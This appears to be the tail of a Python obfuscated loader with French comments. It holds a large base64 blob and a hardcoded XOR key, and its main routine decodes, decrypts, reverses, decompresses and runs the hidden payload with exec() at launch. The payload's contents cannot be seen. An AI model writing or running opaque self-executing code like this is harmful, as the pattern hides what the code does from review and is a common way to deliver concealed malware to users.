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"
_DECRYPTION_KEY = [104, 86, 66, 88, 105, 99, 70, 116, 70, 88, 110, 111, 102, 83, 105, 48]

# ============================================================================
# EXÉCUTION PRINCIPALE
# ============================================================================

def _main_execution():
    """Point d'entrée principal avec gestion d'erreurs complète"""
    try:
        # Phase 1: Décodage Base64
        try:
            decoded_data = base64.b64decode(_ENCRYPTED_DATA)
        except base64.binascii.Error as e:
            print("ERREUR: Données Base64 corrompues")
            print(f"Détail: {e}")
            return 1
        
        # Phase 2: Déchiffrement XOR
        try:
            decrypted_data = _xor_decrypt(decoded_data, bytes(_DECRYPTION_KEY))
        except Exception as e:
            print("ERREUR: Échec du déchiffrement")
            print("La clé de déchiffrement est incorrecte ou les données sont corrompues")
            return 1
        
        # Phase 3: Inversion
        reversed_data = decrypted_data[::-1]
        
        # Phase 4: Décompression
        try:
            decompressed_data = zlib.decompress(reversed_data)
        except zlib.error as e:
            print("ERREUR: Échec de la décompression")
            print("Les données sont corrompues ou ont été altérées")
            return 1
        
        # Phase 5: Exécution
        try:
            # Création d'un environnement d'exécution sécurisé
            exec_globals = {
                '__name__': '__main__',
                '__file__': sys.argv[0],
                '__package__': None,
                '__builtins__': __builtins__,
            }
            
            # Exécution du code
            exec(decompressed_data, exec_globals)
            return 0
            
        except KeyboardInterrupt:
            print("\nInterrompu par l'utilisateur")
            return 130
        except SystemExit as e:
            return e.code if isinstance(e.code, int) else 0
        except Exception as e:
            # Mode debug activé par variable d'environnement
            if os.environ.get('OBF_DEBUG') == '1':
                import traceback
                print("ERREUR D'EXÉCUTION:")
                traceback.print_exc()
            else:
                print("ERREUR: Le script a rencontré une erreur")
                print("Pour plus de détails, exécutez:")
                print(f"  OBF_DEBUG=1 python3 {sys.argv[0]}")
            return 1
            
    except MemoryError:
        print("ERREUR: Mémoire insuffisante")
        print("Le script nécessite plus de mémoire RAM")
        return 1
    except Exception as e:
        print(f"ERREUR FATALE: {type(e).__name__}: {e}")
        return 1

# ============================================================================
# POINT D'ENTRÉE
# ============================================================================

if __name__ == '__main__':
    # Vérification des arguments pour le mode debug
    if '--debug' in sys.argv or '-d' in sys.argv:
        os.environ['OBF_DEBUG'] = '1'
    
    # Affichage info version si demandé
    if '--version' in sys.argv or '-v' in sys.argv:
        print("Script obfusqué - Compatible Linux Universel")
        print(f"Python: {sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro}")
        print(f"Plateforme: {sys.platform}")
        sys.exit(0)
    
    # Exécution principale
    exit_code = _main_execution()
    sys.exit(exit_code)
